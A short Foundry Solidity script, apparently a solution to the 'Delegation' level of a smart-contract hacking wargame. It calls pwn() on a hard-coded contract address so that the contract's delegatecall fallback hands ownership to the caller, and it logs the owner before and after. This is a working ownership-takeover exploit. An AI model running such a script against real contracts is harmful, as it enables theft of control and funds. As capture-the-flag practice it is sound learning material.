//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "../src/Delegation.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";
import "../lib/forge-std/src/Test.sol";

contract DelegationSolution is Script {

    Delegation delegationInstance = Delegation(0x032FceF2f83A8AaD6AE18F97DeAA473f95c8B964);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Previous Owner: ", delegationInstance.owner());
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log("Current Owner: ", delegationInstance.owner());
        vm.stopBroadcast();
    }

}

